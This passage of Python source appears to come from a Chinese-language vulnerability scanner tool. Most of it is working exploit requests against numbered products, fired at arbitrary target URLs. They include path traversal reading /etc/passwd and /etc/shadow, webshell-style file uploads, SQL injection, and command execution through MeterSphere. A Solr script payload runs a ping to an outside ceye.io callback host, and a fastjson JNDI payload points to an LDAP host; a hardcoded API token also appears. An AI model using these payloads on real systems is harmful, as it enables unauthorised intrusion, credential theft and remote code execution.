                            self.append_to_output(f"[+] 返回数据为: {res} ", "red")
                        else:
                            self.append_to_output(f"[-] {url} 不存在企望制造ERP系统 RCE漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "64.契约锁电子章系统漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    if url.endswith("/"):
                        path = "callback/%2E%2E;/code/upload"
                    else:
                        path = "/callback/%2E%2E;/code/upload"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url_new = 'http://' + url
                    else:
                        url_new = url
                    encodetext = url_new + path
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                        "Content-Type": "multipart/form-data",
                    }

                    data = '''ndary=----GokVTLZMRxcJWKfeCvEsYHlszxE\r\n----GokVTLZMRxcJWKfeCvEsYHlszxE\r\nContent-Disposition: form-data; name="type";\r\n\r\nTIMETASK\r\n----GokVTLZMRxcJWKfeCvEsYHlszxE\r\nContent-Disposition: form-data; name="file"; filename="qys.jpg"\r\n\r\n666\r\n\r\n----GokVTLZMRxcJWKfeCvEsYHlszxE'''
                    self.append_to_output("===================================================================","green")
                    try:
                        #requests.packages.urllib3.disable_warnings()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, data=data, headers=headers, verify=False, timeout=5, proxies=proxies)
                        res = req.text
                        if req.status_code == 200:
                            self.append_to_output(f"[+] {url} 存在契约锁电子章系统漏洞！！！！", "red")
                            #self.append_to_output(res, "yellow")
                            self.append_to_output(f"[+] 返回数据为: {res} ", "red")
                        else:
                            self.append_to_output(f"[-] {url} 不存在契约锁电子章系统漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "65.金盘 微信管理平台 未授权访问漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    headers = {
                        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
                        "Accept": "*/*",
                        "Connection": "close",
                        "Accept-Language": "en",
                        "Accept-Encoding": "gzip,deflate",
                        "Cookie": "JSESSIONID=0ACA9A10E980D81EBCEB2FB0919C8782"
                    }
                    if url.endswith("/"):
                        path = "admin/weichatcfg/getsysteminfo"
                    else:
                        path = "/admin/weichatcfg/getsysteminfo"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path

                    try:
                        req = requests.get(encodetext, headers=headers, verify=False, timeout=15, proxies=proxies)
                        res = req.text
                        if req.status_code == 200:
                            self.append_to_output(f"[+] {url} 存在金盘 微信管理平台 未授权访问漏洞！！！！", "red")
                            # self.append_to_output(res, "yellow")
                            self.append_to_output(f"[+] 返回数据为: {res} ", "red")
                        else:
                            self.append_to_output(f"[-] {url} 不存在金盘 微信管理平台 未授权访问漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "66.绿盟 SAS堡垒机 GetFile 任意文件读取漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    headers = {
                        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
                        "Accept": "*/*",
                        "Connection": "close",
                        "Accept-Language": "en",
                        "Accept-Encoding": "gzip,deflate",
                        "Cookie": "JSESSIONID=0ACA9A10E980D81EBCEB2FB0919C8782"
                    }
                    if url.endswith("/"):
                        path = "webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd"
                    else:
                        path = "/webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path

                    try:
                        req = requests.get(encodetext, headers=headers, verify=False, timeout=15, proxies=proxies)
                        res = req.text
                        if req.status_code == 200:
                            if 'service is unavailable' in res or 'Your ip cannot access' in res:
                                self.append_to_output(f"[-] {url} 不存在绿盟 SAS堡垒机 GetFile 任意文件读取漏洞", "green")
                            else:
                                self.append_to_output(f"[+] {url} 存在绿盟 SAS堡垒机 GetFile 任意文件读取漏洞！！！！", "red")
                                # self.append_to_output(res, "yellow")
                                self.append_to_output(f"[+] 返回数据为: {res} ", "red")
                        else:
                            self.append_to_output(f"[-] {url} 不存在绿盟 SAS堡垒机 GetFile 任意文件读取漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "67.深信服 SG上网优化管理系统 任意文件读取漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    if url.endswith("/"):
                        path = "php/catjs.php"
                    else:
                        path = "/php/catjs.php"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url_new = 'http://' + url
                    else:
                        url_new = url
                    encodetext = url_new + path
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
                        "Accept": "*/*",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                        "Connection": "close",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Sec-Fetch-Dest": "document",
                        "Sec-Fetch-Mode": "navigate",
                        "Sec-Fetch-Site": "none",
                    }

                    data = '''["../../../../../../etc/shadow"]'''
                    self.append_to_output("===================================================================","green")
                    try:
                        #requests.packages.urllib3.disable_warnings()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, data=data, headers=headers, verify=False, timeout=5, proxies=proxies)
                        res = req.text
                        if req.status_code == 200 and 'etc/shadow' in res:
                            if 'SANGFOR上网优化管理' in res or '302 Found' in res:
                                self.append_to_output(f"[-] {url} 不存在深信服 SG上网优化管理系统 任意文件读取漏洞", "green")
                            else:
                                self.append_to_output(f"[+] {url} 存在深信服 SG上网优化管理系统 任意文件读取漏洞！！！！", "red")
                                #self.append_to_output(res, "yellow")
                                self.append_to_output(f"[+] 返回数据为: {res} ", "red")
                        else:
                            self.append_to_output(f"[-] {url} 不存在深信服 SG上网优化管理系统 任意文件读取漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "68.亿赛通电子文档安全管理系统RCE漏洞":
                    # 替换成您的CEYE API信息
                    api_base_url = "http://api.ceye.io/v1"
                    api_token = "394eb5e86394352a6270dc6a60dc7848"
                    payload_id = "0uim95.ceye.io"
                    id_one=""
                    id_change=""

                    # 构建API请求的参数
                    params = {
                        "token": api_token,
                        "type": "dns",
                        "filter": payload_id
                    }

                    # 构建API请求的URL
                    request_url = f"{api_base_url}/records"

                    if url.endswith("/"):
                        path = "solr/flow/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=%0A%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%0A%20%20%3Cscript%3E%3C!%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc(row)%7B%0A%20var%20bufReader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22ping%200uim95.ceye.io%22).getInputStream()))%3B%0A%0Avar%20result%20%3D%20%5B%5D%3B%0A%0Awhile(true)%20%7B%0Avar%20oneline%20%3D%20bufReader.readLine()%3B%0Aresult.push(%20oneline%20)%3B%0Aif(!oneline)%20break%3B%0A%7D%0A%0Arow.put(%22title%22%2Cresult.join(%22%5Cn%5Cr%22))%3B%0Areturn%20row%3B%0A%0A%7D%0A%0A%5D%5D%3E%3C%2Fscript%3E%0A%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20stream%3D%22true%22%0A%20%20%20%20%20%20%20%20name%3D%22entity1%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20rootEntity%3D%22true%22%0A%20%20%20%20%20%20%20%20forEach%3D%22%2FRDF%2Fitem%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22title%22%20xpath%3D%22%2FRDF%2Fitem%2Ftitle%22%20%2F%3E%0A%20%20%20%20%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20"
                    else:
                        path = "/solr/flow/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=%0A%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%0A%20%20%3Cscript%3E%3C!%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc(row)%7B%0A%20var%20bufReader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22ping%200uim95.ceye.io%22).getInputStream()))%3B%0A%0Avar%20result%20%3D%20%5B%5D%3B%0A%0Awhile(true)%20%7B%0Avar%20oneline%20%3D%20bufReader.readLine()%3B%0Aresult.push(%20oneline%20)%3B%0Aif(!oneline)%20break%3B%0A%7D%0A%0Arow.put(%22title%22%2Cresult.join(%22%5Cn%5Cr%22))%3B%0Areturn%20row%3B%0A%0A%7D%0A%0A%5D%5D%3E%3C%2Fscript%3E%0A%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20stream%3D%22true%22%0A%20%20%20%20%20%20%20%20name%3D%22entity1%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20rootEntity%3D%22true%22%0A%20%20%20%20%20%20%20%20forEach%3D%22%2FRDF%2Fitem%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22title%22%20xpath%3D%22%2FRDF%2Fitem%2Ftitle%22%20%2F%3E%0A%20%20%20%20%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url_new = 'http://' + url
                    else:
                        url_new = url
                    encodetext = url_new + path

                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    payload = {
                        "a": {
                            "@type": "java.lang.Class",
                            "val": "com.sun.rowset.JdbcRowSetImpl"
                        },
                        "b": {
                            "@type": "com.sun.rowset.JdbcRowSetImpl",
                            "dataSourceName": "ldap://0uim95.ceye.io",
                            "autoCommit": True
                        },
                        "hfe4zyyzldp": "="
                    }
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.1383.67 Safari/537.36",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept": "*/*",
                        "Connection": "close"
                    }
                    xml_data = '''<?xml version="1.0" encoding="UTF-8"?>
                    <RDF>
                        <item/>
                    </RDF>'''
                    self.append_to_output("===================================================================","green")
                    try:
                        response_ceye = requests.get(request_url, params=params, verify=False, proxies=None)
                        if response_ceye.status_code == 200:
                            data = response_ceye.json()
                            records = data.get("data", [])
                            id_records = data.get("data", [id])
                            for id_record in id_records:
                                id_num = id_record.get("id",[])
                                id_one = int(id_num)
                                self.append_to_output(str(id_num), "yellow")
                                break
                            id_count = len(records)

                            if id_count > 0:
                                self.append_to_output(f"[-] CEYE收到请求记录，共收到 {id_count} 个id属性记录。", "yellow")
                                self.append_to_output("[!] 请求记录列表：", "yellow")
                                for record in records:
                                    self.append_to_output(str(record), "yellow")
                            else:
                                self.append_to_output("[-] CEYE没有收到请求记录。", "yellow")

                        else:
                            self.append_to_output("[-] API请求失败。HTTP状态码：", response_ceye.status_code)

                        response = requests.post(encodetext, headers=headers, data=xml_data, verify=False, timeout=10, proxies=proxies)
                        res =response.text
                        if 'code' in res:
                            self.append_to_output(Fore.GREEN + f"[+] {url} 可能存在亿赛通电子文档安全管理系统RCE漏洞，等待ceyelog日志确认！！！！", "red")
                            self.append_to_output(res, "yellow")

                            response_ceye = requests.get(request_url, params=params, verify=False, timeout=10, proxies=proxies)
                            if response_ceye.status_code == 200:
                                data = response_ceye.json()
                                records = data.get("data", [])
                                id_count_change = len(records)
                                id_records = data.get("data", [id])
                                for id_record in id_records:
                                    id_num = id_record.get("id", [])
                                    id_change = int(id_num)
                                    self.append_to_output(str(id_num), "yellow")
                                    break
                                if id_change > id_one:
                                    self.append_to_output(f"[!] CEYE收到请求记录，共收到 {id_count_change} 个id属性记录。99%确认存在漏洞", "red")
                                    self.append_to_output("请求记录列表：", "yellow")
                                    for record in records:
                                        self.append_to_output(str(record), "yellow")
                                else:
                                    self.append_to_output(f"[-] CEYE没有收到请求记录，误报。", "green")

                            else:
                                self.append_to_output(f"[-] API请求失败。HTTP状态码：{response_ceye.status_code}", "green")
                        else:
                            self.append_to_output(Fore.RED + f"[-] {url} 不存在亿赛通电子文档安全管理系统RCE漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，但是检测一下ceye是否有变化: {url}", "yellow")
                        response_ceye = requests.get(request_url, params=params, verify=False, timeout=10, proxies=proxies)
                        if response_ceye.status_code == 200:
                            data = response_ceye.json()
                            records = data.get("data", [])
                            id_count_change = len(records)
                            id_records = data.get("data", [id])
                            for id_record in id_records:
                                id_num = id_record.get("id", [])
                                id_change = int(id_num)
                                self.append_to_output(str(id_num), "yellow")
                                break
                            #if id_count_change > id_count:
                            if id_change > id_one:
                                self.append_to_output(f"[!] CEYE收到请求记录，共收到 {id_count_change} 个id属性记录。99%确认存在漏洞", "red")
                                self.append_to_output("[-] 请求记录列表：", "yellow")
                                for record in records:
                                    self.append_to_output(str(record), "yellow")
                                self.append_to_output(f"[+] 确认 {url} 存在亿赛通电子文档安全管理系统RCE漏洞", "red")
                            else:
                                self.append_to_output("[-] CEYE没有收到请求记录，跳过这个URL。", "green")

                        else:
                            self.append_to_output(f"[-] API请求失败。HTTP状态码：{response_ceye.status_code}", "green")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "69.HiKVISION-综合安防管理平台env信息泄漏漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    headers = {
                        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
                        "Accept": "*/*",
                        "Connection": "close",
                        "Accept-Language": "en",
                        "Accept-Encoding": "gzip,deflate",
                    }
                    if url.endswith("/"):
                        path = "artemis-portal/artemis/env"
                    else:
                        path = "/artemis-portal/artemis/env"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path

                    try:
                        req = requests.get(encodetext, headers=headers, verify=False, timeout=15, proxies=proxies)
                        res = req.text
                        if req.status_code == 200:
                            self.append_to_output(f"[+] {url} 存在HiKVISION-综合安防管理平台env信息泄漏漏洞！！！！", "red")
                            # self.append_to_output(res, "yellow")
                            self.append_to_output(f"[+] 返回数据为: {res} ", "red")
                        else:
                            self.append_to_output(f"[-] {url} 不存在HiKVISION-综合安防管理平台env信息泄漏漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "70.时空智友企业流程化管控系统文件上传漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    if url.endswith("/"):
                        path = "formservice?service=attachment.write&isattach=false&filename=a.jsp"
                    else:
                        path = "/formservice?service=attachment.write&isattach=false&filename=a.jsp"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url_new = 'http://' + url
                    else:
                        url_new = url
                    encodetext = url_new + path
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
                        "Accept": "*/*",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                        "Connection": "close",
                    }

                    data = '''6666666666'''
                    self.append_to_output("===================================================================","green")
                    try:
                        #requests.packages.urllib3.disable_warnings()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
                        res = req.text
                        res_xml =req.content
                        # 解析XML字符串
                        root = ET.fromstring(res_xml)
                        # 获取文本内容
                        value = root.text
                        if req.status_code == 200 and value.strip() != "":
                            self.append_to_output(f"[+] {url} 存在时空智友企业流程化管控系统文件上传漏洞！！！！", "red")
                            #self.append_to_output(res, "yellow")
                            self.append_to_output(f"[+] 返回数据为: {res} ", "red")
                            self.append_to_output(f"[+] 返回的文件名为: {value} ", "red")
                        else:
                            self.append_to_output(f"[-] {url} 不存在时空智友企业流程化管控系统文件上传漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "71.易思智能物流无人值守系统文件上传漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    if url.endswith("/"):
                        path = "Sys_ReportFile/ImportReport?encode=a"
                    else:
                        path = "/Sys_ReportFile/ImportReport?encode=a"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url_new = 'http://' + url
                    else:
                        url_new = url
                    encodetext = url_new + path
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
                        "Accept": "*/*",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                        "Connection": "close",
                        "Content-Type": "multipart/form-data; boundary= ----WebKitFormBoundaryxzUhGld6cusN3Alk",
                    }

                    data = '''------WebKitFormBoundaryxzUhGld6cusN3Alk\r\nContent-Disposition: form-data; name="file"; .filename="test.grf;.aspx"\r\nContent-Type: application/octet-stream\r\n\r\ntest666\r\n------WebKitFormBoundaryxzUhGld6cusN3Alk--'''
                    self.append_to_output("===================================================================","green")
                    try:
                        #requests.packages.urllib3.disable_warnings()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
                        res = req.text

                        if req.status_code == 200 and 'a.aspx' in res:
                            self.append_to_output(f"[+] {url} 存在易思智能物流无人值守系统文件上传漏洞！！！！", "red")
                            #self.append_to_output(res, "yellow")
                            self.append_to_output(f"[+] 返回数据为: {res} ", "red")
                        else:
                            self.append_to_output(f"[-] {url} 不存在易思智能物流无人值守系统文件上传漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "72.明源云ERP系统 接口管家ApiUpdate.ashx任意文件上传漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    if url.endswith("/"):
                        path = "myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a"
                    else:
                        path = "/myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url_new = 'http://' + url
                    else:
                        url_new = url
                    encodetext = url_new + path
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
                        "Accept": "*/*",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                        "Connection": "close",
                    }

                    data = '''{{hexdec(504B030414000000080063740E576AE37B2383000000940000001D0000002E2E2F2E2E2F2E2E2F666463636C6F75642F5F2F746573742E6173707825CC490AC2401404D0BDA7685A02C9A62F90288A22041C42E2B0FE4A11033DD983E0EDFDE2AEA8575453AC444723C49EEC98392CE4662E45B16C185AE35D48E24806D1D3836DF8C404A3DAD37F227A066723D42D4C09A53C23A66BD65656F56ED2505B68703F20BC11D4817C47E959F678651EAA4BD06A7D8F4EE7841F5455CDB7B32F504B0102140314000000080063740E576AE37B2383000000940000001D00000000000000000000008001000000002E2E2F2E2E2F2E2E2F666463636C6F75642F5F2F746573742E61737078504B050600000000010001004B000000BE0000000000)}}'''
                    self.append_to_output("===================================================================","green")
                    try:
                        #requests.packages.urllib3.disable_warnings()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
                        res = req.text

                        if req.status_code == 200 and 'OK' in res:
                            self.append_to_output(f"[+] {url} 存在明源云ERP系统 接口管家ApiUpdate.ashx任意文件上传漏洞！！！！", "red")
                            #self.append_to_output(res, "yellow")
                            self.append_to_output(f"[+] 返回数据为: {res} ", "red")
                        else:
                            self.append_to_output(f"[-] {url} 不存在明源云ERP系统 接口管家ApiUpdate.ashx任意文件上传漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                # if vulnerability == "73.DVR":
                #     proxies = {
                #         'http': 'http://127.0.0.1:8080',
                #         'https': 'http://127.0.0.1:8080'
                #     }
                #
                #     if url.endswith("/"):
                #         path = "device.rsp?opt=user&cmd=list"
                #     else:
                #         path = "/device.rsp?opt=user&cmd=list"
                #
                #     if not url.startswith('http://') and not url.startswith('https://'):
                #         url_new = 'http://' + url
                #     else:
                #         url_new = url
                #     encodetext = url_new + path
                #
                #     def makeReqHeaders(xCookie):
                #         headers["Host"] = url_new
                #         headers["User-Agent"] = "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)"
                #         headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
                #         headers["Accept-Languag"] = "es-AR,en-US;q=0.7,en;q=0.3"
                #         headers["Connection"] = "close"
                #         headers["Content-Type"] = "text/html"
                #         headers["Cookie"] = "uid=" + xCookie
                #
                #         return headers
                #
                #     self.append_to_output("===================================================================","green")
                #     try:
                #         rX = requests.get(encodetext, headers=makeReqHeaders(xCookie="admin"), timeout=10.000, proxies=proxies)
                #         badJson = rX.text
                #         try:
                #             dataJson = json.loads(badJson)
                #             totUsr = len(dataJson["list"])
                #             self.append_to_output(f"[+] DVR (url):{url_new}","red")
                #             self.append_to_output(f"[+] Users List:\t{dataJson}","red")
                #             final_data = []
                #             try:
                #                 for obj in range(0, totUsr):
                #                     temp = []
                #
                #                     _usuario = dataJson["list"][obj]["uid"]
                #                     _password = dataJson["list"][obj]["pwd"]
                #                     _role = dataJson["list"][obj]["role"]
                #
                #                     temp.append(url_new)
                #                     temp.append(_usuario)
                #                     temp.append(_password)
                #                     temp.append(_role)
                #
                #                     final_data.append(temp)
                #
                #                     hdUrl = "URL"
                #                     hdUsr = "Username"
                #                     hdPass = "Password"
                #                     hdRole = "Role ID"
                #
                #                     cabeceras = [hdUrl, hdUsr, hdPass, hdRole]
                #
                #                 tp.table(final_data, cabeceras, width=20)
                #             except Exception as e:
                #                 self.append_to_output(" [!]: " + str(e),"green")
                #                 self.append_to_output(" [+] " + str(dataJson),"green")
                #         except Exception as e:
                #             self.append_to_output(" [+] Error: " + str(e),"green")
                #             self.append_to_output(" [>] json: " + str(rX),"green")
                #     except Exception as e:
                #         # print(e)
                #         self.append_to_output(" [+] Timed out\n","yellow")
                if vulnerability == "75.CVE-2021-29490":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    headers = {
                        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
                        "Accept": "*/*",
                        "Connection": "close",
                        "Accept-Language": "en",
                        "Accept-Encoding": "gzip,deflate",
                    }
                    if url.endswith("/"):
                        path = "Images/Remote?imageUrl=http://www.baidu.com"
                    else:
                        path = "/Images/Remote?imageUrl=http://www.baidu.com"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path

                    try:
                        req = requests.get(encodetext, headers=headers, verify=False, timeout=15, proxies=proxies)
                        res = req.text
                        if req.status_code == 200 and '百度一下，你就知道' in res:
                            self.append_to_output(f"[+] {url} 存在CVE-2021-29490！！！！", "red")
                            # self.append_to_output(res, "yellow")
                            self.append_to_output(f"[+] 返回数据为: {res} ", "red")
                        else:
                            self.append_to_output(f"[-] {url} 不存在CVE-2021-29490", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "76.网御ACM上网行为管理系统SQL注入漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    headers = {
                        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
                        "Accept": "*/*",
                        "Connection": "close",
                        "Accept-Language": "en",
                        "Accept-Encoding": "gzip,deflate",
                    }
                    if url.endswith("/"):
                        path = "bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23"
                    else:
                        path = "/bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path

                    try:
                        req = requests.get(encodetext, headers=headers, verify=False, timeout=15, proxies=proxies)
                        res = req.text
                        if req.status_code == 200 and 'ca42' in res:
                            self.append_to_output(f"[+] {url} 存在网御ACM上网行为管理系统SQL注入漏洞！！！！", "red")
                            # self.append_to_output(res, "yellow")
                            self.append_to_output(f"[+] 返回数据为: {res} ", "red")
                        else:
                            self.append_to_output(f"[-] {url} 不存在网御ACM上网行为管理系统SQL注入漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "77.MeterSphere customMethod 远程命令执行漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    if url.endswith("/"):
                        path = "plugin/customMethod"
                    else:
                        path = "/plugin/customMethod"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url_new = 'http://' + url
                    else:
                        url_new = url
                    encodetext = url_new + path
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
                        "Accept": "*/*",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                        "Connection": "close",
                    }

                    data = '''{"entry":"Evil","request":"id"}'''
                    self.append_to_output("===================================================================","green")
                    try:
                        #requests.packages.urllib3.disable_warnings()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, data=data, headers=headers, verify=False, timeout=5, proxies=proxies)
                        res = req.text

                        if req.status_code == 200 and 'root' in res:
                            self.append_to_output(f"[+] {url} 存在MeterSphere customMethod 远程命令执行漏洞！！！！", "red")
                            #self.append_to_output(res, "yellow")
                            self.append_to_output(f"[+] 返回数据为: {res} ", "red")
                        else:
                            self.append_to_output(f"[-] {url} 不存在MeterSphere customMethod 远程命令执行漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "78.致远OA_M1Server_userTokenService远程命令执行漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    if url.endswith("/"):
                        path = "esn_mobile_pns/service/userTokenService"
                    else:
                        path = "/esn_mobile_pns/service/userTokenService"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url_new = 'http://' + url
                    else:
                        url_new = url
                    encodetext = url_new + path
                    headers = {
